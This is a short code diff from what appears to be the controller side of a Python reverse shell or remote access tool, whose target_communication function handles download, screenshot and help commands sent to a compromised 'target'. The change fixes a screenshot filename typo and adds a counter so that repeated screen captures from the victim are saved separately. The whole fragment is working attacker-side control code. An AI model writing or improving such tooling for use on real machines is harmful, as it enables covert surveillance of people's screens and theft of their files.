@@ -50,7 +50,7 @@ def target_communication():
 		elif command[:8] == "download":
 			download_file(command[9:])
 		elif command[:10] == "screenshot":
-			f = open("screenots%d" % (count), 'wb')
+			f = open("screenshot%d" % (count), 'wb')
 			target.settimeout(3)
 			chunk = target.recv(1024) 
 			while True:
@@ -61,6 +61,7 @@ def target_communication():
 					break
 			target.settimeout(None)
 			f.close()
+			count +=1
 		elif command == "help":
 			            print(colored('''\n
             quit                                --> Quit Session With The Target
